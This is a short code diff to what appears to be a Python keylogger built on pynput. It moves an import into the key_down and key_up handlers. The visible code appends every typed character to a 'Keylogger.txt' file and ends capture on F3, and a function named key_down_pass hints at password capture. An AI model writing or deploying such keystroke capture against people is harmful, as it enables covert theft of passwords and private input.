@@ -2,10 +2,10 @@ import os
 import subprocess
 from rich import print
 from rich.table import Table
-from pynput.keyboard import Key
 
 
 def key_down(key):
+    from pynput.keyboard import Key
     log = open('Keylogger.txt', mode='a')
     try:
         log.write(key.char)
@@ -29,6 +29,7 @@ def key_down_pass(key):
 
 
 def key_up(key):
+    from pynput.keyboard import Key
     if key == Key.f3:
         return False
 
